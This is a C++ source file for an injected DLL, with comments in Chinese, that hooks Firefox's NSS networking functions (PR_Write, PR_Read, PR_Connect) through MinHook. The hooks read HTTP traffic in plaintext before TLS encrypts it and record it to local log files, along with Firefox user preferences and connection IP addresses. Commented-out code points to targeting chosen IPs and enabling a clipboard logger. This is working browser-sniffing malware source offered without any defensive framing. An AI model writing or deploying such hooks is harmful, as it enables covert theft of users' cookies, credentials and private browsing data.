// HookFireFox.cpp : 定義 DLL 的匯出函式。
//
#include "pch.h"
#include "HookFireFox.h"
#include <MinHook.h>
#include <string>
#include "dynamic_library.h"
#include "utils.h"
#include <sstream> 
#include <iomanip>
#include <stdint.h>


PR_Write_t fpPR_Write = nullptr;
PR_Read_t fpPR_Read = nullptr;
PR_Connect_t fpPR_Connect = nullptr;
//
// 引用 IPControl.h 中定義的全局變數
//extern std::atomic<bool> g_clipboardLoggerEnabled;
//extern std::vector<std::string> g_targetIPs;

int HookedPR_Write(void* fd, char* buf, int amount)
{
	std::string data = reinterpret_cast<const char*>(buf);

	// handle user preferences
	if (StrContain(data, "// Mozilla User Preferences"))
	{
		ClearFile("user_pref.txt");
		Log("user_pref.txt", buf);
		goto ret;
	}
	else if (StrContain(data, "user_pref"))
	{
		Log("user_pref.txt", buf);
		goto ret;
	}

	// log HTTP 的封包內容
	if (StrContain(data, "HTTP"))
	{
		Log("http.txt", "--- Write ---\n");
		Log("http.txt", buf);
		Log("http.txt", "\n---\n");
	}

ret:
	// 記錄原始資料
	Log("raw.txt", "--- Write ---\n");
	Log("raw.txt", buf);
	Log("raw.txt", "\n---\n");
	return fpPR_Write(fd, buf, amount);
}

int HookedPR_Read(void* fd, void* buf, int amount)
{
	int val = fpPR_Read(fd, buf, amount);
	std::string data = reinterpret_cast<const char*>(buf);

	// log HTTP 的封包內容
	if (StrContain(data, "HTTP"))
	{
		Log("http.txt", "--- Read ---\n");
		Log("http.txt", data);
		Log("http.txt", "\n---\n");
	}

ret:
	Log("raw.txt", "--- Read ---\n");
	Log("raw.txt", data);
	Log("raw.txt", "\n---\n");
	return val;
}

typedef struct PRIPv6Addr {
	uint8_t ipv6[16]; // IPv6 位址（128 位）
} PRIPv6Addr;

typedef struct PRNetAddr {
	uint16_t family;      // 位址類型，例如 AF_INET（2）或 AF_INET6（10）
	uint16_t port;        // 網絡序的端口號
	union {
		uint32_t ipv4;    // IPv4 地址（32 位）
		PRIPv6Addr ipv6;  // IPv6 地址
	} addr;
} PRNetAddr;


int HookedPR_Connect(void* fd, const void* addr, unsigned int timeout) {
	const PRNetAddr* netAddr = reinterpret_cast<const PRNetAddr*>(addr);
	std::string ipAddress;
	uint16_t port = netAddr->port;

	// 解析 IP 地址
	if (netAddr->family == 2) {  // IPv4
		uint32_t ipv4 = netAddr->addr.ipv4;
		// 修改順序為正確的 192.168.x.x
		ipAddress = std::to_string(ipv4 & 0xFF) + "." +                // 最低位元組
			std::to_string((ipv4 >> 8) & 0xFF) + "." +                // 次低位元組
			std::to_string((ipv4 >> 16) & 0xFF) + "." +               // 次高位元組
			std::to_string((ipv4 >> 24) & 0xFF);                      // 最高位元組
	}
	else if (netAddr->family == 10) {  // IPv6
		std::ostringstream oss;
		const uint8_t* ipv6Addr = netAddr->addr.ipv6.ipv6; // 獲取 IPv6 位址陣列
		for (int i = 0; i < 16; i += 2) {  // 逐 16 位解析
			oss << std::hex
				<< std::setw(2) << std::setfill('0') << static_cast<int>(ipv6Addr[i])
				<< std::setw(2) << std::setfill('0') << static_cast<int>(ipv6Addr[i + 1]);
			if (i < 14) oss << ":"; // 添加冒號分隔
		}
		ipAddress = oss.str();
	}

	// 檢查是否為目標 IP
	/*bool isTargetIP = false;
	for (const auto& targetIP : g_targetIPs) {
		if (ipAddress == targetIP) {
			isTargetIP = true;
			break;
		}
	}*/

	// 設置 logger 狀態
	//g_clipboardLoggerEnabled.store(isTargetIP);

	// 記錄連線信息和 logger 狀態
	Log("connect_log.txt", "--- PR_Connect Called ---\n");
	Log("connect_log.txt", "IP: " + ipAddress + "\n");
	//Log("connect_log.txt", "Setting enabled state to: " + std::string(isTargetIP ? "true" : "false") + "\n");
	//Log("connect_log.txt", "Verify enabled state: " + std::string(g_clipboardLoggerEnabled.load() ? "true" : "false") + "\n");
	return fpPR_Connect(fd, addr, timeout);
}
BOOL InstallHooks()
{
	if (MH_Initialize() != MH_OK)
	{
		return FALSE;
	}

	// Hook nss3.dll 中的 PR_Write 函數
	HINSTANCE nss3dLL = GetModuleHandleW(L"nss3.dll");
	if (nss3dLL == NULL) {
		Log("log.txt", "[-] Get nss3.dll handle failed.\n");
		return FALSE;
	}

	// setting PR_Write
	PR_Write_t PR_Write = (PR_Write_t)GetProcAddress(nss3dLL, "PR_Write");
	if (PR_Write == NULL) {
		Log("log.txt", "[-] Get PR_Write from nss3.dll failed.\n");
		return FALSE;
	}

	if (MH_CreateHook(PR_Write, &HookedPR_Write, reinterpret_cast<LPVOID*>(&fpPR_Write)) != MH_OK)
	{
		Log("log.txt", "[-] MinHook: create hook failed.\n");
		return FALSE;
	}

	if (MH_EnableHook(PR_Write) != MH_OK)
	{
		Log("log.txt", "[-] MinHook: enable hook failed.\n");
		return FALSE;
	}

	// Setting PR_Read
	/*PR_Write_t PR_Read = (PR_Write_t)GetProcAddress(nss3.dLL, "PR_Read");
	if (PR_Write == NULL) {
		Log("log.txt", "[-] Get PR_Read from nss3.dll failed.\n");
		return FALSE;
	}

	if (MH_CreateHook(PR_Read, &HookedPR_Read, reinterpret_cast<LPVOID*>(&fpPR_Read)) != MH_OK)
	{
		Log("log.txt", "[-] MinHook: create hook failed.\n");
		return FALSE;
	}

	if (MH_EnableHook(PR_Read) != MH_OK)
	{
		Log("log.txt", "[-] MinHook: enable hook failed.\n");
		return FALSE;
	}*/

	// Setting PR_Connect
	PR_Connect_t PR_Connect = (PR_Connect_t)GetProcAddress(nss3dLL, "PR_Connect");
	if (PR_Connect == NULL) {
		Log("log.txt", "[-] Get PR_Connect from nss3.dll failed.\n");
		return FALSE;
	}

	if (MH_CreateHook(PR_Connect, &HookedPR_Connect, reinterpret_cast<LPVOID*>(&fpPR_Connect)) != MH_OK)
	{
		Log("log.txt", "[-] MinHook: create PR_Connect hook failed.\n");
		return FALSE;
	}

	if (MH_EnableHook(PR_Connect) != MH_OK)
	{
		Log("log.txt", "[-] MinHook: enable PR_Connect hook failed.\n");
		return FALSE;
	}
	Log("log.txt", "[+] Hook installed.\n");
	return TRUE;
}

void UninstallHooks()
{
	MH_DisableHook(MH_ALL_HOOKS);
	MH_Uninitialize();
}

void HookFireFox(void)
{
	std::string currentProcessPath = GetCurrentProcessPath();
	if (FindCaseInsensitive(currentProcessPath, "firefox") != std::string::npos)
	{
		// hooking
		Log("log.txt", "[*] installing hook, pid=" + std::to_string(GetCurrentProcessId()) + ".\n");
		InstallHooks();
	}
}
